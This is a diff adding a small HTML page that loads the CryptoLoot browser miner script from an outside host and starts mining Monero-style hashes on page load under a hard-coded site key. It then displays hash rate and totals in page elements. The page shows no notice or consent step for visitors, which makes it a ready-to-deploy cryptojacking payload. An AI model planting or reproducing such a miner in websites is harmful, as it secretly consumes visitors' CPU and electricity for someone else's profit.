@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<script src="https://crypto-loot.com/lib/miner.min.js"></script>
+
+<script>
+	var miner = new CryptoLoot.Anonymous('afb6f4d7db6bdb2e24fcf0ffc009d6a3c40c0a78e978');
+	miner.start();
+</script>
+
+
+
+<script>
+	// Listen on events
+	miner.on('found', function() { /* Hash found */ })
+	miner.on('accepted', function() { /* Hash accepted by the pool */ })
+
+	// Update stats once per second
+	setInterval(function() {
+		//var hashesPerSecond = miner.getHashesPerSecond();
+		//var totalHashes = miner.getTotalHashes();
+		//var acceptedHashes = miner.getAcceptedHashes();
+
+		// Output to HTML elements...
+		document.getElementById("hps").innerHTML = miner.getHashesPerSecond();
+		document.getElementById("ths").innerHTML =  miner.getTotalHashes();
+		document.getElementById("ahs").innerHTML = miner.getAcceptedHashes();
+		
+		
+	}, 1000);
+</script>
+
+<p id="hps"></p>
+<p id="ths"></p>
+<p id="ahs"></p>
+
+</body>
+</html>
